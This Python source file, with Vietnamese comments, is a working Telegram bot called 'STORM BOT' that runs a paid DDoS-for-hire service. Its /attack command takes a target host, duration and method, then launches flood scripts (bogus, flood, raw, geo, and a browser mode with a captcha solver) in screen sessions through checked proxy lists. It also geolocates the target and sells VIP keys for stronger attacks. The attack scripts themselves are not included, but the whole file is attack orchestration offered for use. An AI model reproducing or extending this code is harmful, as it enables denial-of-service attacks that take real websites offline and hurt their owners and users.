import telebot
import json
import os
import time
import random
import string
import psutil
import re
import threading
import requests
import concurrent.futures
from queue import Queue
import logging
import subprocess
from urllib.parse import urlparse

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='bot.log')

# Constants
# nhớ lên rose lấy id account telegram của mình và tạo bot nha rồi điền token bot vô
TOKEN = ""
OWNER_ID = 7789279179 # thay vào không cần '' -> OWNER_ID = 7xxxxxxxxxxxxxx
ADMIN_IDS = [] # thay vào
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

start_time = time.time()

VN_PROXY_FILE = "vn.txt"
US_PROXY_FILE = "us.txt"
ONGOING_ATTACKS_FILE = "ongoing_attacks.json"
KEYS_FILE = "keys.json"
USERS_FILE = "use.json"

RATE = 22
THREAD = 20  # Default thread, BROWSER uses fixed 24

# Global variables
auto_kill_timers = {}
user_command_state = {}
bot_active = True
total_running_attacks = 0
attack_queue = Queue(maxsize=15)

# Thread locks
ongoing_attacks_lock = threading.Lock()
attack_state_lock = threading.Lock()
auto_kill_timers_lock = threading.Lock()

# File I/O functions
def load_users():
    return json.load(open(USERS_FILE)) if os.path.exists(USERS_FILE) else {}

def save_users(users):
    json.dump(users, open(USERS_FILE, "w"), indent=4)

def load_keys():
    return json.load(open(KEYS_FILE)) if os.path.exists(KEYS_FILE) else {}

def save_keys(keys):
    json.dump(keys, open(KEYS_FILE, "w"), indent=4)

def load_ongoing_attacks():
    return json.load(open(ONGOING_ATTACKS_FILE)) if os.path.exists(ONGOING_ATTACKS_FILE) else {}

def save_ongoing_attacks(attacks):
    json.dump(attacks, open(ONGOING_ATTACKS_FILE, "w"), indent=4)

USERS = load_users()
ONGOING_ATTACKS = load_ongoing_attacks()
KEYS = load_keys()
running_count = {}
hidden_admins = set()

# Utility decorator
def delay_response(delay_time=0.01):
    def decorator(func):
        def wrapper(message):
            try:
                bot.send_chat_action(message.chat.id, "typing")
            except Exception as e:
                logging.error(f"Failed to send chat action: {e}")
            time.sleep(delay_time)
            return func(message)
        return wrapper
    return decorator

# Safe message reply
def safe_reply_to(message, text, parse_mode="HTML"):
    retries = 3
    for attempt in range(retries):
        try:
            bot.reply_to(message, text, parse_mode=parse_mode)
            return
        except Exception as e:
            logging.error(f"Failed to send message: {e}. Retrying ({attempt+1}/{retries})...")
            time.sleep(2)
    logging.error("Failed to send message after retries.")

# Helper functions
def generate_attack_id():
    return str(random.randint(100000, 999999))

def generate_key():
    letters = random.choices(string.ascii_lowercase, k=3)
    digits = random.choices(string.digits, k=3)
    return "#" + "".join(letters + digits)

def format_duration(seconds):
    days = seconds // 86400
    hours = (seconds % 86400) // 3600
    minutes = (seconds % 3600) // 60
    seconds = seconds % 60
    return f"{int(days)}d {int(hours)}h {int(minutes)}m {int(seconds)}s"

def auto_kill_screen(attack_id):
    global total_running_attacks
    subprocess.run(["screen", "-X", "-S", f"attack{attack_id}", "quit"])
    with ongoing_attacks_lock:
        if attack_id in ONGOING_ATTACKS:
            user = ONGOING_ATTACKS[attack_id]["user_id"]
            with attack_state_lock:
                if running_count.get(user, 0) > 0:
                    running_count[user] -= 1
                if total_running_attacks > 0:
                    total_running_attacks -= 1
            del ONGOING_ATTACKS[attack_id]
            save_ongoing_attacks(ONGOING_ATTACKS)
    with auto_kill_timers_lock:
        if attack_id in auto_kill_timers:
            del auto_kill_timers[attack_id]
    logging.info(f"Auto-killed screen session for attack {attack_id}")

# Hàm lấy thông tin từ IP-API.com
def get_ip_api_info(hostname):
    api_url = f"http://ip-api.com/json/{hostname}"
    try:
        response = requests.get(api_url, timeout=5)
        response.raise_for_status()
        data = response.json()
        unwanted_keys = ["status", "countryCode", "region", "regionName", "zip"]
        filtered_data = {k: v for k, v in data.items() if k not in unwanted_keys}
        return filtered_data
    except requests.RequestException as e:
        logging.error(f"Failed to fetch IP-API data for {hostname}: {e}")
        return {}

# Command handlers
@bot.message_handler(commands=["start", "help", "show", "bot"])
@delay_response(0.01)
def start_or_help(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    help_text = """<pre>⛈️ STORM BOT ⛈️
🍃 User:
• /attack ⛈️ - Launch attack
• /methods ☁️ - List methods
• /plan 📜 - Check plan

⛈️ Admin:
• /add 🍃 - Add user
• /rm 🍃 - Remove user
• /ongoing ⚡ - Ongoing attacks
• /kill 'id' ⚡ - Stop attack
• /killnow ⛈️ - Stop all (VIP)
• /on /off 🛑 - Bot status (Owner)
• /redeem 'key' 🎁 - Redeem VIP
• /getkey 🔑 - New key (Owner)
• /setvn 🇻🇳 - VN proxy (Owner)
• /setus 🇺🇸 - US proxy (Owner)
• /server 💻 - Server stats (Owner)
• /set 'rate' 'thread' ⚙️ - Set config
• /ref 🔄 - Refresh proxies (Owner)
</pre>"""
    safe_reply_to(message, help_text)

@bot.message_handler(commands=["methods"])
@delay_response(0.01)
def show_methods(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    methods_info = """<pre>☁️ Methods:
☁️ BOGUS - Normal request/s (Non-VIP)
⛈️ FLOOD - Powerful flood (VIP)
⛈️ GEO - Geo-bypass VN (VIP)
⛈️ RAW - High request (VIP)
⛈️ BROWSER - Browser + captcha solver (VIP)
</pre>"""
    safe_reply_to(message, methods_info)

@bot.message_handler(commands=["set"])
@delay_response(0.01)
def set_rate_thread(message):
    global RATE, THREAD
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    if message.from_user.id not in ADMIN_IDS:
        safe_reply_to(message, "<pre>❌ No permission ⚙️</pre>")
        return
    args = message.text.split()
    if len(args) != 3:
        safe_reply_to(message, "<pre>⚠️ /set 'rate' 'thread'</pre>")
        return
    try:
        RATE, THREAD = int(args[1]), int(args[2])
        if RATE <= 0 or THREAD <= 0:
            raise ValueError
        safe_reply_to(message, f"<pre>✅ Rate: {RATE} | Thread: {THREAD} ⚙️</pre>")
    except ValueError:
        safe_reply_to(message, "<pre>⚠️ Use positive integers</pre>")

@bot.message_handler(commands=["add"])
@delay_response(0.01)
def add_user(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    if message.from_user.id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ No permission 🍃</pre>")
        return
    args = message.text.split()
    if len(args) != 8:
        safe_reply_to(message, "<pre>⚠️ /add 'id' 'time' 'slot' 'cooldown' 'vip' 'bypass' 'conc'</pre>")
        return
    try:
        user_id, max_time, slot, cooldown, is_vip, bypass, max_conc = args[1], int(args[2]), int(args[3]), int(args[4]), args[5].lower() == 'true', args[6].lower() == 'true', int(args[7])
        if slot > 5 or max_conc > slot:
            safe_reply_to(message, "<pre>❌ Slot ≤ 5, Conc ≤ Slot</pre>")
            return
        USERS[user_id] = {"maxtime": max_time, "slot": slot, "cooldown": cooldown, "used": 0, "last_used": 0, "vip": is_vip, "bypass": bypass, "max_conc": max_conc}
        save_users(USERS)
        safe_reply_to(message, f"<pre>✅ Added {user_id} 🍃\nTime: {max_time}s 🌧️\nSlot: {slot} 🌩️\nConc: {max_conc} ⛈️\nCooldown: {cooldown}s ☁️\nVIP: {is_vip} 🌟\nBypass: {bypass} ⚡</pre>")
    except ValueError:
        safe_reply_to(message, "<pre>⚠️ Invalid numbers</pre>")

@bot.message_handler(commands=["ongoing"])
@delay_response(0.01)
def ongoing(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    user_id = str(message.from_user.id)
    with ongoing_attacks_lock:
        attacks = ONGOING_ATTACKS.copy() if message.from_user.id in ADMIN_IDS else {aid: atk for aid, atk in ONGOING_ATTACKS.items() if atk["user_id"] == user_id}
    if not attacks:
        safe_reply_to(message, "<pre>⚡ No attacks</pre>")
        return
    ongoing_info = "<pre>⚡ Ongoing:\n"
    current_time = time.time()
    for attack_id, attack in attacks.items():
        remaining = max(0, attack["time"] - (current_time - attack["start_time"]))
        ongoing_info += f"{attack['id']} ⛈️ {attack['host']} 🌧️ {attack['method']} ⚙️ {int(remaining)}s ☁️\n"
    ongoing_info += "</pre>"
    safe_reply_to(message, ongoing_info)

@bot.message_handler(commands=["getkey"])
@delay_response(0.01)
def get_key(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    if message.from_user.id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ No permission 🔑</pre>")
        return
    new_key = generate_key()
    KEYS[new_key] = {"redeemed": False}
    save_keys(KEYS)
    safe_reply_to(message, f"<pre>🔑 Key: {new_key}</pre>")

@bot.message_handler(commands=["redeem"])
@delay_response(0.01)
def redeem(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    if len(args) != 2:
        safe_reply_to(message, "<pre>⚠️ /redeem 'key'</pre>")
        return
    key = args[1]
    if key not in KEYS or KEYS[key]["redeemed"]:
        safe_reply_to(message, "<pre>❌ Invalid or used key 🎁</pre>")
        return
    user_id = str(message.from_user.id)
    USERS[user_id] = USERS.get(user_id, {"maxtime": 300, "slot": 1, "cooldown": 90, "used": 0, "last_used": 0, "max_conc": 1})
    USERS[user_id]["vip"] = True
    save_users(USERS)
    KEYS[key]["redeemed"] = True
    save_keys(KEYS)
    safe_reply_to(message, "<pre>✅ VIP activated 🎁</pre>")

@bot.message_handler(commands=["attack"])
@delay_response(0.01)
def attack(message):
    global running_count, auto_kill_timers, total_running_attacks
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    user_id = str(message.from_user.id)

    if len(args) < 4 or len(args) > 10:
        safe_reply_to(message, f"<pre>⚠️ {'/attack host time method conc proxyfile' if message.from_user.id in ADMIN_IDS else '/attack host time method'}</pre>")
        return

    host, time_, method = args[1], args[2], args[3].lower()
    try:
        time_ = int(time_)
    except ValueError:
        safe_reply_to(message, "<pre>⚠️ Time must be a number</pre>")
        return

    # Parse URL and add default scheme if missing
    parsed_url = urlparse(host)
    if not parsed_url.scheme:
        host = "https://" + host
        parsed_url = urlparse(host)
    if parsed_url.scheme not in ["http", "https"]:
        safe_reply_to(message, "<pre>⚠️ Invalid scheme. Use http or https.</pre>")
        return
    clean_host = parsed_url.netloc
    if not clean_host:
        safe_reply_to(message, "<pre>⚠️ Invalid hostname</pre>")
        return
    clean_host = re.sub(r'^(www\.)', '', clean_host).rstrip('/')

    # Validate cleaned hostname
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', clean_host):
        safe_reply_to(message, "<pre>⚠️ Invalid hostname</pre>")
        return

    conc = 1
    proxy_file = "us.txt"
    post = query = randuser = "true"
    if message.from_user.id in ADMIN_IDS and len(args) >= 5:
        try:
            conc = int(args[4])
        except ValueError:
            pass
        if method in ["geo", "browser"]:
            proxy_file = "vn.txt" if method == "geo" else (args[5] if len(args) > 5 else "us.txt")
            if method == "browser" and proxy_file not in ["vn.txt", "us.txt"]:
                safe_reply_to(message, "<pre>⚠️ Browser: Use vn.txt or us.txt</pre>")
                return
            for i in range(6, len(args), 2):
                if i + 1 < len(args):
                    if args[i] == "--post": post = args[i + 1].lower()
                    elif args[i] == "--query": query = args[i + 1].lower()
                    elif args[i] == "--randuser": randuser = args[i + 1].lower()

    if method in ["geo", "browser"] and not os.path.exists(proxy_file):
        safe_reply_to(message, f"<pre>❌ {proxy_file} not found</pre>")
        return

    user_data = USERS.get(user_id, {"maxtime": 75, "slot": 1, "cooldown": 45, "vip": False, "bypass": False, "last_used": 0, "max_conc": 1})
    if "max_conc" not in user_data:
        user_data["max_conc"] = user_data["slot"]

    if conc < 1 or conc > user_data["max_conc"]:
        safe_reply_to(message, f"<pre>❌ Conc: 1-{user_data['max_conc']}</pre>")
        return

    # Kiểm tra quyền người dùng
    if user_id not in USERS:
        if method.lower() != "bogus" or time_ > 75:
            safe_reply_to(message, "<pre>❌ Free: BOGUS, max 75s</pre>")
            return
    elif not user_data.get("vip", False):
        if method.lower() != "bogus" or time_ > user_data["maxtime"]:
            safe_reply_to(message, f"<pre>❌ Non-VIP: BOGUS, max {user_data['maxtime']}s</pre>")
            return
    elif time_ > user_data["maxtime"]:
        safe_reply_to(message, f"<pre>❌ Max time: {user_data['maxtime']}s</pre>")
        return

    time_ += 100 if method == "browser" else 0

    with attack_state_lock:
        user_running = running_count.get(user_id, 0)
        if not user_data.get("bypass", False):
            if conc > 1:
                safe_reply_to(message, "<pre>❌ No bypass for conc > 1</pre>")
                return
            if user_running >= user_data["slot"] and time.time() - user_data.get("last_used", 0) < user_data["cooldown"]:
                safe_reply_to(message, f"<pre>🔄 Wait {int(user_data['cooldown'] - (time.time() - user_data.get('last_used', 0)))}s</pre>")
                return
        if user_running + conc > user_data["slot"] or total_running_attacks + conc > 15 or attack_queue.qsize() + conc > 15:
            safe_reply_to(message, "<pre>❌ Limit reached</pre>")
            return
        for _ in range(conc):
            attack_queue.put(1)
        running_count[user_id] = user_running + conc
        total_running_attacks += conc

    # Lấy thông tin từ IP-API.com using clean_host
    ip_api_data = get_ip_api_info(clean_host)

    attack_ids = []
    for _ in range(conc):
        attack_id = generate_attack_id()
        with ongoing_attacks_lock:
            ONGOING_ATTACKS[attack_id] = {"id": attack_id, "host": host, "port": 443, "time": time_, "method": method.upper(), "user_id": user_id, "start_time": time.time(), "hidden": message.from_user.id in hidden_admins}
            save_ongoing_attacks(ONGOING_ATTACKS)

        cmd = ["screen", "-dmS", f"attack{attack_id}"]
        if method == "bogus":
            cmd.extend(["node", "bogus", "GET", host, str(time_), str(THREAD), str(RATE), "us.txt", "--cdn", "--http", "mix", "--delay", "1", "--ios", "--googlebot"])
        elif method == "flood":
            cmd.extend(["node", "flood", host, str(time_), str(THREAD), str(RATE), "us.txt", "nm"])
        elif method == "raw":
            cmd.extend(["node", "raw", host, str(time_), str(THREAD), str(RATE), "us.txt"])
        elif method == "geo":
            cmd.extend(["node", "bogus", "GET", host, str(time_), str(THREAD), str(RATE), "vn.txt", "--cdn", "--http", "mix", "--delay", "1", "--ios", "--googlebot"])
        elif method == "browser":
            cmd.extend(["python3", "m.py", host, str(time_), "24", str(RATE), proxy_file, "--post", post, "--query", query, "--randuser", randuser])
        subprocess.run(cmd)

        timer = threading.Timer(time_, auto_kill_screen, args=(attack_id,))
        timer.start()
        with auto_kill_timers_lock:
            auto_kill_timers[attack_id] = timer
        attack_ids.append(attack_id)

    if not user_data.get("bypass", False) or user_id not in USERS:
        user_data["last_used"] = time.time()
        USERS[user_id] = user_data
        save_users(USERS)

    for _ in range(conc):
        attack_queue.get()

    # Lấy thông tin người dùng
    username = message.from_user.first_name or message.from_user.username or "Unknown"
    plan = "VIP" if user_data.get("vip", False) else "Free"

    # Tạo JSON response
    attack_info = {
        "Hello": username,
        "Host": host,  # Keep original host for display
        "Method": method.upper(),
        "Time": str(time_),
        "Plan": plan
    }
    # Kết hợp với dữ liệu từ IP-API
    attack_info.update(ip_api_data)
    json_response = json.dumps(attack_info, indent=4, ensure_ascii=False)

    # Gửi JSON với cú pháp tô màu
    safe_reply_to(message, f"```json\n{json_response}\n```", parse_mode="MarkdownV2")

@bot.message_handler(commands=["killnow"])
@delay_response(0.01)
def kill_now(message):
    global total_running_attacks
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    user_id = str(message.from_user.id)
    if user_id not in USERS or not USERS[user_id].get("vip", False):
        safe_reply_to(message, "<pre>❌ VIP only ⛈️</pre>")
        return
    with ongoing_attacks_lock:
        if not ONGOING_ATTACKS:
            safe_reply_to(message, "<pre>❌ No attacks ⛈️</pre>")
            return
        killed_ids = []
        for attack_id in list(ONGOING_ATTACKS.keys()):
            with auto_kill_timers_lock:
                if attack_id in auto_kill_timers:
                    auto_kill_timers[attack_id].cancel()
                    del auto_kill_timers[attack_id]
            subprocess.run(["screen", "-X", "-S", f"attack{attack_id}", "quit"])
            user = ONGOING_ATTACKS[attack_id]["user_id"]
            with attack_state_lock:
                if running_count.get(user, 0) > 0:
                    running_count[user] -= 1
                if total_running_attacks > 0:
                    total_running_attacks -= 1
            killed_ids.append(ONGOING_ATTACKS[attack_id]["id"])
            del ONGOING_ATTACKS[attack_id]
        save_ongoing_attacks(ONGOING_ATTACKS)
        subprocess.run(["pkill", "-f", "bogus"])
        subprocess.run(["pkill", "-f", "flood"])
        subprocess.run(["pkill", "-f", "raw"])
        subprocess.run(["pkill", "-f", "node"])
        subprocess.run(["pkill", "-f", "floodbrs"])
        subprocess.run(["pkill", "-f", "python3 m.py"])
    safe_reply_to(message, f"<pre>✅ Killed: {', '.join(killed_ids)} ⛈️</pre>")

@bot.message_handler(commands=["kill"])
@delay_response(0.01)
def kill(message):
    global total_running_attacks
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        safe_reply_to(message, "<pre>⚠️ /kill 'id'</pre>")
        return
    user_id = str(message.from_user.id)
    attack_ids = args[1:]
    killed_ids = []
    with ongoing_attacks_lock:
        for attack_id in attack_ids:
            if attack_id in ONGOING_ATTACKS and (message.from_user.id in ADMIN_IDS or ONGOING_ATTACKS[attack_id]["user_id"] == user_id):
                with auto_kill_timers_lock:
                    if attack_id in auto_kill_timers:
                        auto_kill_timers[attack_id].cancel()
                        del auto_kill_timers[attack_id]
                subprocess.run(["screen", "-X", "-S", f"attack{attack_id}", "quit"])
                with attack_state_lock:
                    if running_count.get(ONGOING_ATTACKS[attack_id]["user_id"], 0) > 0:
                        running_count[ONGOING_ATTACKS[attack_id]["user_id"]] -= 1
                    if total_running_attacks > 0:
                        total_running_attacks -= 1
                killed_ids.append(attack_id)
                del ONGOING_ATTACKS[attack_id]
        save_ongoing_attacks(ONGOING_ATTACKS)
    safe_reply_to(message, f"<pre>{'✅ Killed: ' + ', '.join(killed_ids) if killed_ids else '❌ No valid IDs'} ⚡</pre>")

@bot.message_handler(commands=["plan"])
@delay_response(0.01)
def plan(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    user_id = str(message.from_user.id)
    if message.from_user.id in ADMIN_IDS and message.reply_to_message:
        target_user_id = str(message.reply_to_message.from_user.id)
        user_data = USERS.get(target_user_id, {"maxtime": 75, "slot": 1, "cooldown": 45, "vip": False, "bypass": False, "max_conc": 1})
        max_conc = user_data.get("max_conc", user_data["slot"])
        safe_reply_to(message, f"<pre>📜 {target_user_id}:\nTime: {user_data['maxtime']}s 🌧️\nSlot: {user_data['slot']} 🌩️\nConc: {max_conc} ⛈️\nCooldown: {user_data['cooldown']}s ☁️\nVIP: {user_data.get('vip', False)} 🌟\nBypass: {user_data.get('bypass', False)} ⚡</pre>")
        return
    user_data = USERS.get(user_id, {"maxtime": 75, "slot": 1, "cooldown": 45, "vip": False, "bypass": False, "max_conc": 1})
    max_conc = user_data.get("max_conc", user_data["slot"])
    safe_reply_to(message, f"<pre>📜 Your Plan:\nTime: {user_data['maxtime']}s 🌧️\nSlot: {user_data['slot']} 🌩️\nConc: {max_conc} ⛈️\nCooldown: {user_data['cooldown']}s ☁️\nVIP: {user_data.get('vip', False)} 🌟\nBypass: {user_data.get('bypass', False)} ⚡</pre>")

@bot.message_handler(commands=["on"])
@delay_response(0.01)
def bot_on(message):
    global bot_active
    if message.from_user.id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ Owner only 🛑</pre>")
        return
    bot_active = True
    safe_reply_to(message, "<pre>✅ Bot ON 🟢</pre>")

@bot.message_handler(commands=["off"])
@delay_response(0.01)
def bot_off(message):
    global bot_active
    if message.from_user.id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ Owner only 🛑</pre>")
        return
    bot_active = False
    safe_reply_to(message, "<pre>🔴 Bot OFF</pre>")

@bot.message_handler(commands=["server"])
@delay_response(0.01)
def server_status(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    if message.from_user.id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ Owner only 💻</pre>")
        return
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    uptime = format_duration(time.time() - start_time)
    safe_reply_to(message, f"<pre>💻 Server:\nCPU: {cpu}% ⚙️\nRAM: {mem.percent}% 🧠\nDisk: {disk.percent}% 💾\nUptime: {uptime} ⏰</pre>")

@bot.message_handler(commands=['setvn'])
@delay_response(0.01)
def set_vn(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    if message.from_user.id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ Owner only 🇻🇳</pre>")
        return
    user_command_state[message.from_user.id] = "vn"
    safe_reply_to(message, "<pre>🔼 Send VN proxy file</pre>")

@bot.message_handler(commands=['setus'])
@delay_response(0.01)
def set_us(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    if message.from_user.id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ Owner only 🇺🇸</pre>")
        return
    user_command_state[message.from_user.id] = "us"
    safe_reply_to(message, "<pre>🔼 Send US proxy file</pre>")

def check_proxy(proxy):
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        response = requests.get("https://www.google.com/", proxies=proxies, headers=headers, timeout=3)
        return proxy if response.status_code == 200 else None
    except Exception:
        return None

@bot.message_handler(content_types=['document'])
@delay_response(0.01)
def handle_document(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ Owner only 📤</pre>")
        return
    if message.document.mime_type != "text/plain" or user_id not in user_command_state:
        safe_reply_to(message, "<pre>⚠️ Send .txt file after /setvn or /setus</pre>")
        return
    command = user_command_state[user_id]
    target_file = VN_PROXY_FILE if command == "vn" else US_PROXY_FILE
    file_info = bot.get_file(message.document.file_id)
    content = bot.download_file(file_info.file_path).decode("utf-8", errors="ignore")
    proxies = [line.strip() for line in content.splitlines() if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}:\d+$", line.strip())]
    if not proxies:
        safe_reply_to(message, "<pre>❌ Empty or invalid file</pre>")
        return
    with concurrent.futures.ThreadPoolExecutor(max_workers=170) as executor:
        valid_proxies = [p for p in executor.map(check_proxy, proxies) if p]
    with open(target_file, "w", encoding="utf-8") as f:
        f.write("\n".join(valid_proxies))
    safe_reply_to(message, f"<pre>✅ Updated {command.upper()}: {len(valid_proxies)} 📤</pre>")

@bot.message_handler(commands=['ref'])
@delay_response(0.01)
def refresh_proxies(message):
    if not bot_active and message.from_user.id != OWNER_ID:
        return
    if message.from_user.id != OWNER_ID:
        safe_reply_to(message, "<pre>❌ Owner only 🔄</pre>")
        return
    us_count = refresh_proxy_file(US_PROXY_FILE)
    vn_count = refresh_proxy_file(VN_PROXY_FILE)
    safe_reply_to(message, f"<pre>✅ Refreshed 🔄\nUS: {us_count} 🇺🇸\nVN: {vn_count} 🇻🇳</pre>")

def refresh_proxy_file(file_path):
    if not os.path.exists(file_path):
        return 0
    with open(file_path, "r", encoding="utf-8") as f:
        proxies = [line.strip() for line in f.readlines() if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}:\d+$", line.strip())]
    if not proxies:
        return 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        valid_proxies = [p for p in executor.map(check_proxy, proxies) if p]
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("\n".join(valid_proxies))
    return len(valid_proxies)

def main_loop():
    while True:
        try:
            bot.infinity_polling(timeout=100000)
        except Exception as e:
            logging.error(f"Polling error: {e}. Restarting...")
            time.sleep(5)

if __name__ == "__main__":
    main_loop()